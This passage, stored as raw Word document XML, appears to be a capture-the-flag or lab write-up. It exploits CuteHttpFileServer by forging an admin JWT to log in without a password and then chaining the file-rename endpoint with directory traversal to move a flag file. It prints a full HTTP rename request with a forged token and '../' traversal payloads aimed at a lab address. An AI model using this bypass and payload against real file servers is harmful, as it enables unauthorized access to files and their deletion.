          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>If you are not logged in admin, you only have the permission to download, but not the permission to rename or delete</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="39"/>
    <w:bookmarkStart w:name="ua23822fc" w:id="40"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u5cb337c7" w:id="41"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="2535163"/>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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="7670800" cy="3328780"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:bookmarkEnd w:id="41"/>
    </w:p>
    <w:bookmarkEnd w:id="40"/>
    <w:bookmarkStart w:name="BlIjl" w:id="42"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>second</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="42"/>
    <w:bookmarkStart w:name="u22741afc" w:id="43"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Passwordless login is achieved by using the JWT obtained before</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="43"/>
    <w:bookmarkStart w:name="u23a456eb" w:id="44"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u4c7fb99c" w:id="45"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="2354208"/>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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="8026400" cy="3234478"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:bookmarkEnd w:id="45"/>
    </w:p>
    <w:bookmarkEnd w:id="44"/>
    <w:bookmarkStart w:name="QRiId" w:id="46"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>successful jwt forgery</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="46"/>
    <w:bookmarkStart w:name="uba247b0d" w:id="47"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Pressing F5 to refresh the browser, it was observed that the administrator user has logged in successfully without needing a password. Hence, we can utilize the same method to log in as any identity, while also gaining elevated privileges, including the ability to rename and delete.</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="47"/>
    <w:bookmarkStart w:name="uea73d04c" w:id="48"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u0e0b97cf" w:id="49"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5841999" cy="1752463"/>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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="11954933" cy="3586200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:bookmarkEnd w:id="49"/>
    </w:p>
    <w:bookmarkEnd w:id="48"/>
    <w:bookmarkStart w:name="yQ0p5" w:id="50"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>Further exploit</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="50"/>
    <w:bookmarkStart w:name="u57b32b2a" w:id="51"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>After logging in as the admin user, you gain the ability to rename files. Combining this with a historical vulnerability in URL directory traversal, you can move any file from one location to another. For instance, moving /flag/flag/flag.txt to the default working directory /home/ming/share_main.</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="51"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u4149266a" w:id="52"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>POST /chfs/rename HTTP/1.1</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="52"/>
    <w:bookmarkStart w:name="ud351bd4d" w:id="53"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Host: 172.17.0.3:8000</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="53"/>
    <w:bookmarkStart w:name="uecdf45f2" w:id="54"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="54"/>
    <w:bookmarkStart w:name="u092dc2e0" w:id="55"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Accept: */*</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="55"/>
    <w:bookmarkStart w:name="u5d623c74" w:id="56"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Accept-Language: en-US,en;q=0.5</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="56"/>
    <w:bookmarkStart w:name="u3979cc3e" w:id="57"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Accept-Encoding: gzip, deflate, br</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="57"/>
    <w:bookmarkStart w:name="ude82889b" w:id="58"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cache-control: no-cache</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="58"/>
    <w:bookmarkStart w:name="u5e787c35" w:id="59"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Content-Type: multipart/form-data; boundary=---------------------------387492560430303528193503395152</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="59"/>
    <w:bookmarkStart w:name="u30293e96" w:id="60"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Content-Length: 377</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="60"/>
    <w:bookmarkStart w:name="u5254b6ba" w:id="61"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Origin: </w:t>
      </w:r>
      <w:hyperlink r:id="rId14">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
            <w:b w:val="false"/>
            <w:i w:val="false"/>
            <w:color w:val="0000ff"/>
            <w:sz w:val="22"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
            <w:b w:val="false"/>
            <w:i w:val="false"/>
            <w:color w:val="0000ff"/>
            <w:sz w:val="22"/>
          </w:rPr>
          <w:t>http://172.17.0.3:8000</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:bookmarkEnd w:id="61"/>
    <w:bookmarkStart w:name="u46867076" w:id="62"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Connection: close</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="62"/>
    <w:bookmarkStart w:name="ud7c29867" w:id="63"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Referer: </w:t>
      </w:r>
      <w:hyperlink r:id="rId15">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
            <w:b w:val="false"/>
            <w:i w:val="false"/>
            <w:color w:val="0000ff"/>
            <w:sz w:val="22"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
            <w:b w:val="false"/>
            <w:i w:val="false"/>
            <w:color w:val="0000ff"/>
            <w:sz w:val="22"/>
          </w:rPr>
          <w:t>http://172.17.0.3:8000/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:bookmarkEnd w:id="63"/>
    <w:bookmarkStart w:name="u374c9abc" w:id="64"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2MiOiJhZG1pbiIsImV4cCI6MTcwOTI3Mjc3OH0.oXGZf37LrABxC01z05W-Z_imorz59LFapLI0bL8GJtc; {9c2028b6-2cb2-4ff5-bf33-e17126a2eeba}=value; user=admin</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="64"/>
    <w:bookmarkStart w:name="u31139e4b" w:id="65"/>
    <w:bookmarkEnd w:id="65"/>
    <w:bookmarkStart w:name="u4774610a" w:id="66"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>-----------------------------387492560430303528193503395152</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="66"/>
    <w:bookmarkStart w:name="u96647d2f" w:id="67"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Content-Disposition: form-data; name="new"</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="67"/>
    <w:bookmarkStart w:name="u7cda2745" w:id="68"/>
    <w:bookmarkEnd w:id="68"/>
    <w:bookmarkStart w:name="u0b3bd5cb" w:id="69"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fming%2Fshare_main%2Fflag.txt</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="69"/>
    <w:bookmarkStart w:name="ucbfca059" w:id="70"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>-----------------------------387492560430303528193503395152</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="70"/>
    <w:bookmarkStart w:name="u7b4edf8b" w:id="71"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Content-Disposition: form-data; name="old"</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="71"/>
    <w:bookmarkStart w:name="u61a8d3ce" w:id="72"/>
    <w:bookmarkEnd w:id="72"/>
    <w:bookmarkStart w:name="u84d040f1" w:id="73"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/../../../../flag/flag/flag.txt</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="73"/>
    <w:bookmarkStart w:name="uefa414be" w:id="74"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>-----------------------------387492560430303528193503395152--</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="74"/>
    <w:bookmarkStart w:name="ud83fad07" w:id="75"/>
    <w:bookmarkEnd w:id="75"/>
    <w:bookmarkStart w:name="ube7f5d00" w:id="76"/>
    <w:bookmarkEnd w:id="76"/>
    <w:bookmarkStart w:name="u71cc27ed" w:id="77"/>
    <w:bookmarkEnd w:id="77"/>
    <w:bookmarkStart w:name="ude470e14" w:id="78"/>
    <w:bookmarkEnd w:id="78"/>
    <w:sectPr>
      <w:pgSz w:w="11907" w:h="16839" w:code="9"/>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宋体" w:eastAsia="宋体"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="42"/>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宋体" w:eastAsia="宋体"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="38"/>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宋体" w:eastAsia="宋体"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="34"/>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宋体" w:eastAsia="宋体"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="30"/>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Heading5">
    <w:name w:val="heading 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading5Char"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00841CD9"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200"/>
      <w:outlineLvl w:val="4"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ne-codeblock"/>
</w:styles>
</file>

<file path=word/_rels/document.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Target="styles.xml" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"/><Relationship Id="rId10" Target="media/document_image_rId10.png" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"/><Relationship Id="rId11" Target="media/document_image_rId11.png" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"/><Relationship Id="rId12" Target="media/document_image_rId12.png" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"/><Relationship Id="rId13" Target="media/document_image_rId13.png" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"/><Relationship Id="rId14" Target="http://172.17.0.3:8000" TargetMode="External" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"/><Relationship Id="rId15" Target="http://172.17.0.3:8000/" TargetMode="External" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"/><Relationship Id="rId2" Target="settings.xml" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings"/><Relationship Id="rId3" Target="numbering.xml" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/numbering"/><Relationship Id="rId4" Target="http://iscute.cn/chfs" TargetMode="External" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"/><Relationship Id="rId5" Target="https://github.com/ods-im/CuteHttpFileServer" TargetMode="External" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"/><Relationship Id="rId6" Target="http://iscute.cn/chfs" TargetMode="External" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"/><Relationship Id="rId7" Target="media/document_image_rId7.png" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"/><Relationship Id="rId8" Target="media/document_image_rId8.png" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"/><Relationship Id="rId9" Target="media/document_image_rId9.png" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"/></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http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
</file>